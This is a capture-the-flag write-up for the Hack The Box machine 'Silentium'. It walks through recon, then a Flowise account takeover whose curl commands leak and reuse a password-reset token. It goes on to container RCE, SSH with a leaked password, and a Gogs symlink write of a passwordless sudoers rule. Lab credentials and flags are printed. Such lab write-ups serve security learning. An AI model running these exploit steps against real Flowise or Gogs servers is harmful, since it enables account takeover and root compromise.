# Walkthrough: Silentium (HTB #867)

**Status: PWNED — user + root, 2026-08-29** ✅

- **Target:** `10.129.106.125` (our own spawned lab instance)
- **Flags:** user `d9c4e6…` · root `c460b0…` (both submitted and accepted;
  full values live in [../flags.log](../flags.log))
- **Attack chain in one sentence:** a polished marketing site was a decoy; the real
  app lived on a hidden **Flowise 3.0.5** vhost where we stole Ben's password reset
  token, ran code as root inside a container, leaked his SSH password from SMTP env
  vars, logged in as `ben`, then abused a local **Gogs** instance to write a
  sudoers file and become root.

---

## Setting the scene: what is this box?

The target presents itself as **"Silentium"** — a fictional institutional lending
and capital firm. The public website (`silentium.htb`) is a clean static marketing
SPA with a loan calculator. It looks like a real fintech product. It is also a
**decoy**: there is no backend API, no login, and every unknown URL returns the
same HTML shell. The real attack surface is elsewhere.

The stack, as fingerprinted:

| Layer | What we found |
|---|---|
| Web server | **nginx 1.24.0** (Ubuntu) — reverse proxy on port 80 |
| Main vhost | Static marketing SPA — vanilla JS, no obfuscation |
| Hidden vhost | **`staging.silentium.htb`** → **Flowise 3.0.5** (LLM orchestration platform) |
| SSH | OpenSSH 9.6p1 on port 22 — useful once we find credentials |

**Auth model (main site):** none. **Auth model (Flowise):** username/password login;
single-org instance with registration disabled. One known user: **`ben@silentium.htb`**
(Head of Financial Systems on the team page).

Only two ports matter from outside: **22** and **80**. nmap confirms nothing else
is exposed. The box is won through web logic, not exotic services.

---

## Recon — the decoy and the hidden door

### Main site: pretty, empty

Browsing `http://silentium.htb/` (Host header required when hitting the IP directly)
returns a 8753-byte static page. ffuf against the IP alone finds nothing useful —
every path 301-redirects to the main hostname. Against `silentium.htb` with the
correct Host header, **all 29,770 fuzz paths return the same SPA shell**. Classic
nginx catch-all: the map looks flat, but that is by design.

The `/assets/app.js` file is a simple loan calculator. No hidden endpoints, no
encrypted payloads, no secrets. **Do not burn hours on the main site.**

### Vhost fuzz: staging is the real app

Virtual-host fuzzing (`ffuf` with a vhost wordlist + `Host:` header) finds one
distinct response:

| Host header | Size | Identity |
|---|---|---|
| `silentium.htb` | 8753 B | Marketing decoy |
| **`staging.silentium.htb`** | 3142 B | **Flowise** React SPA |

Confirm version without guessing:

```bash
curl -H "Host: staging.silentium.htb" http://10.129.106.125/api/v1/version
# {"version":"3.0.5"}
```

Flowise is an open-source tool for building AI agent workflows. Version **3.0.5**
ships with two critical bugs we will chain together.

---

## Flowise enumeration — what talks without a login?

Several API routes respond **without authentication** — `/api/v1/ping`, `/api/v1/settings`,
`/api/v1/account/basic-auth`, and critically **`/api/v1/account/forgot-password`**. Protected
routes (`/api/v1/chatflows`, `/api/v1/credentials`, `/api/v1/node-load-method/customMCP`)
need a session.

To find a valid email, POST forgot-password with different addresses. Invalid users get
`"User Not Found"`. **`ben@silentium.htb`** returns a database error — enough to confirm
the account exists.

---

## Foothold part 1 — account takeover (CVE-2025-58434)

**CVE-2025-58434** is an unauthenticated account takeover in Flowise ≤ 3.0.5. When
you call the forgot-password API for a real user, the JSON response **leaks the
password-reset `tempToken`** — the secret that was supposed to arrive only by email.

Plain English: you ask "please reset Ben's password," and the server hands you the
reset link *in the API reply*. CVSS 9.8.

```bash
# Step 1 — leak the reset token
curl -H "Host: staging.silentium.htb" \
  -X POST http://10.129.106.125/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
# → response includes tempToken

# Step 2 — set a new password
curl -H "Host: staging.silentium.htb" \
  -X POST http://10.129.106.125/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"<token>","password":"Pwned123!"}}'

# Step 3 — login and capture session / API key
curl -H "Host: staging.silentium.htb" \
  -X POST http://10.129.106.125/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"Pwned123!"}'
```

We now have authenticated access to Flowise as Ben.

Exploit script: [../boxes/silentium/loot/flowise_rce.py](../boxes/silentium/loot/flowise_rce.py)

---

## Foothold part 2 — RCE via customMCP (CVE-2025-59528)

**CVE-2025-59528** is authenticated remote code execution. The endpoint
`POST /api/v1/node-load-method/customMCP` evaluates attacker-controlled JavaScript
in `mcpServerConfig` through Node's `Function()` constructor — arbitrary code on
the server. CVSS 10.0. Affects Flowise ≤ 3.0.5.

Send the request with auth headers plus `x-request-from: internal`. The payload
must be wrapped in outer parentheses so it parses as an expression:

```bash
# Concept — authenticated POST with crafted mcpServerConfig IIFE
# → reverse shell or HTTP callback to your listener
```

Our callback proved **`uid=0(root)`** — but inside a **Docker container**, not the
host yet. Still a huge win: we can read environment variables and hunt for creds.

Container env leaked the host pivot:

- `FLOWISE_PASSWORD=F1l3_d0ck3r` (Flowise cred — already owned via ATO)
- **`SMTP_PASSWORD=r04D!!_R4ge`** → Ben's **SSH password** (cred reuse)

---

## User flag — SSH as ben

With creds in hand, leave the container and use the normal front door:

```bash
ssh ben@10.129.106.125
# password: r04D!!_R4ge

cat /home/ben/user.txt
# d9c4e61d327dc597251a859fd3e9f574   → submitted, accepted ✅
```

Masked for notes: `d9c4e6…`

From here we are a real user on the host — time for local enumeration.

---

## Root — Gogs symlink privesc (CVE-2025-8110)

### What we found on the host

**Gogs** (self-hosted Git) on **`127.0.0.1:3001`**, running as **root**, with open
registration (image captcha — solvable via OCR).

**CVE-2025-8110** allows writing file contents via the Gogs API while following
**symlinks**. We create a repo, add a symlink named `malicious_link` pointing at
`/etc/sudoers.d/ben`, then `PUT` base64 content granting Ben passwordless sudo:

```
ben ALL=(ALL) NOPASSWD: ALL
```

Gogs (root) follows the symlink and writes our sudoers drop-in. One `sudo -i` later,
we own the box.

Exploit tooling:

- [../boxes/silentium/loot/gogs_register.py](../boxes/silentium/loot/gogs_register.py) — register + OCR captcha
- [../boxes/silentium/loot/gogs_remote.py](../boxes/silentium/loot/gogs_remote.py) — symlink + sudoers write

```bash
sudo -i
cat /root/root.txt
# c460b0ed31c97b4aa4e84b989ad7bbe1   → submitted, accepted ✅
```

Masked for notes: `c460b0…`

---

## Lessons to remember

> 1. **Decoy SPAs waste time on purpose.** When ffuf returns the same shell for every
>    path, pivot to vhost fuzzing.
> 2. **Version endpoints are gold.** `/api/v1/version` → `3.0.5` mapped to two CVEs.
> 3. **Password reset is an auth boundary.** Token leakage = full account takeover.
> 4. **Container root ≠ host root.** Env-var cred reuse got us SSH.
> 5. **Loopback Gogs as root** + symlink write = passwordless sudo.

---

## Appendix: submitting flags via the HTB API

```bash
curl -X POST https://labs.hackthebox.com/api/v5/machine/own \
     -H "Authorization: Bearer $HTB_TOKEN" -H "Content-Type: application/json" \
     -d '{"id":867,"flag":"<flag>","difficulty":10}'
# → "Silentium user/root is now owned."
```
